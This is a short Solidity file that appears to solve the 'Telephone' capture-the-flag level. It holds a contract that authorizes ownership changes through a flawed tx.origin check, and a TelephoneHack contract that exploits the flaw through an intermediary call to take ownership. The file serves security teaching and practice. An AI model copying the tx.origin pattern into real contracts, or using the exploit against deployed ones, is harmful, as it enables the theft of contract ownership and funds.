// Telephone
// Difficulty 1/10
// Claim ownership of the contract below to complete this level.
//   Things that might help
// See the Help page above, section "Beyond the console"

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneHack {
    function changeOwner(Telephone tel) public {
        tel.changeOwner(msg.sender);
    }
}
